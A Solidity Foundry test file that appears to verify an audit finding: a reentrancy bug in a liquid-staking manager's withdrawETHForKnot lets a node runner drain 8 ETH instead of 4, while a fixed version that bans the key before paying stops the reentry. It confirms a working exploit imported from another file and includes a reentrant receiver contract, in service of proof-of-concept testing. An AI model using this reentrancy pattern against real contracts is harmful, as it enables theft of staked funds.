// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    IDataStructures,
    IOwnableSmartWallet,
    MockAccountManager,
    OwnableSmartWallet
} from "./43028-h-05-reentrancy-in-liquidstakingmanagersolwithdrawethforknow.sol";

/// Same withdraw checks, but the knot is banned before rawExecute.
/// The reentrant entry reverts and the first 4 ETH stays paid.
contract LiquidStakingManagerFixed {
    event ETHWithdrawnFromSmartWallet(address indexed associatedSmartWallet, bytes blsPublicKeyOfKnot, address nodeRunner);

    MockAccountManager public accountManager;
    OwnableSmartWallet public wallet;

    mapping(bytes => address) public smartWalletOfKnot;
    mapping(address => address) public smartWalletOfNodeRunner;
    mapping(address => address) public nodeRunnerOfSmartWallet;
    mapping(bytes => address) public bannedBLSPublicKeys;
    mapping(address => bool) public bannedNodeRunners;

    constructor(MockAccountManager _accountManager, OwnableSmartWallet _wallet) {
        accountManager = _accountManager;
        wallet = _wallet;
    }

    function getAccountManager() public view returns (MockAccountManager) {
        return accountManager;
    }

    function seedKnots(address nodeRunner, bytes calldata knotA, bytes calldata knotB) external {
        require(smartWalletOfNodeRunner[nodeRunner] == address(0), "seeded");
        smartWalletOfNodeRunner[nodeRunner] = address(wallet);
        nodeRunnerOfSmartWallet[address(wallet)] = nodeRunner;
        smartWalletOfKnot[knotA] = address(wallet);
        smartWalletOfKnot[knotB] = address(wallet);
        accountManager.setLifecycleStatus(knotA, IDataStructures.LifecycleStatus.INITIALS_REGISTERED);
        accountManager.setLifecycleStatus(knotB, IDataStructures.LifecycleStatus.INITIALS_REGISTERED);
    }

    function isBLSPublicKeyPartOfLSDNetwork(bytes calldata _blsPublicKeyOfKnot) public view returns (bool) {
        return smartWalletOfKnot[_blsPublicKeyOfKnot] != address(0);
    }

    function isBLSPublicKeyBanned(bytes calldata _blsPublicKeyOfKnot) public view returns (bool) {
        return !isBLSPublicKeyPartOfLSDNetwork(_blsPublicKeyOfKnot) || bannedBLSPublicKeys[_blsPublicKeyOfKnot] != address(0);
    }

    function isNodeRunnerBanned(address _nodeRunner) public view returns (bool) {
        return bannedNodeRunners[_nodeRunner];
    }

    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {
        require(_recipient != address(0), "Zero address");
        require(isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, "BLS public key has already withdrawn or not a part of LSD network");

        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];
        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, "Not the node runner for the smart wallet ");
        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, "Node runner is banned from LSD network");
        require(associatedSmartWallet.balance >= 4 ether, "Insufficient balance");
        require(
            getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,
            "Initials not registered"
        );

        bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;

        IOwnableSmartWallet(associatedSmartWallet).rawExecute(_recipient, "", 4 ether);

        emit ETHWithdrawnFromSmartWallet(associatedSmartWallet, _blsPublicKeyOfKnot, msg.sender);
    }
}

/// Catches the reentrant revert so the fair 4 ETH transfer is not undone.
contract FairRunner {
    LiquidStakingManagerFixed public manager;
    bytes public knot;
    bool internal tried;
    uint256 public received;
    bool public secondReverted;
    string public revertReason;

    constructor(LiquidStakingManagerFixed _manager, bytes memory _knot) {
        manager = _manager;
        knot = _knot;
    }

    function withdraw() external {
        manager.withdrawETHForKnot(address(this), knot);
    }

    receive() external payable {
        received += msg.value;
        if (!tried) {
            tried = true;
            try manager.withdrawETHForKnot(address(this), knot) {
                secondReverted = false;
            } catch Error(string memory reason) {
                secondReverted = true;
                revertReason = reason;
            }
        }
    }
}

contract Finding43028Test is Test {
    function test_exploit_reenters_and_extracts_eight() public {
        Exploit e = new Exploit();
        vm.deal(address(e.wallet()), 8 ether);
        assertEq(address(e.wallet()).balance, 8 ether, "two knots funded");
        assertEq(address(e.runner()).balance, 0, "runner starts empty");

        e.run();

        assertEq(e.walletBefore(), 8 ether, "wallet held 8 ETH");
        assertEq(e.entitled(), 4 ether, "fair refund is 4 ETH");
        assertEq(e.extracted(), 8 ether, "reentrancy paid 8 ETH");
        assertEq(e.secondPayout(), 4 ether, "second payout was 4 ETH");
        assertEq(address(e.runner()).balance, 8 ether, "runner holds both payouts");
        assertEq(address(e.wallet()).balance, 0, "wallet drained");
        assertEq(e.shortfall(), 4 ether, "wallet is short 4 ETH");
        assertTrue(e.runner().reentered(), "receive reentered once");
        assertTrue(e.manager().isBLSPublicKeyBanned(e.knot1()), "withdrawn knot banned after both sends");
        assertFalse(e.manager().isBLSPublicKeyBanned(e.knot2()), "other knot still live and unbacked");

        emit log_named_uint("extracted wei", e.extracted());
        emit log_named_uint("entitled wei", e.entitled());
        emit log_named_uint("shortfall wei", e.shortfall());
        emit log_named_uint("wallet after", address(e.wallet()).balance);
    }

    function test_control_ban_before_send_pays_only_four() public {
        MockAccountManager am = new MockAccountManager();
        OwnableSmartWallet wallet = new OwnableSmartWallet();
        LiquidStakingManagerFixed mgr = new LiquidStakingManagerFixed(am, wallet);
        wallet.setOwner(address(mgr));
        bytes memory k1 = bytes("publicKeys1");
        bytes memory k2 = bytes("publicKeys2");
        FairRunner runner = new FairRunner(mgr, k1);
        mgr.seedKnots(address(runner), k1, k2);
        vm.deal(address(wallet), 8 ether);

        runner.withdraw();

        assertTrue(runner.secondReverted(), "second entry should revert");
        assertEq(
            runner.revertReason(),
            "BLS public key has already withdrawn or not a part of LSD network"
        );
        assertEq(runner.received(), 4 ether, "only the fair refund");
        assertEq(address(runner).balance, 4 ether, "attacker holds 4 ETH");
        assertEq(address(wallet).balance, 4 ether, "second knot's 4 ETH stays");
        assertTrue(mgr.isBLSPublicKeyBanned(k1), "withdrawn knot is banned");
        assertFalse(mgr.isBLSPublicKeyBanned(k2), "other knot stays registered");
    }
}
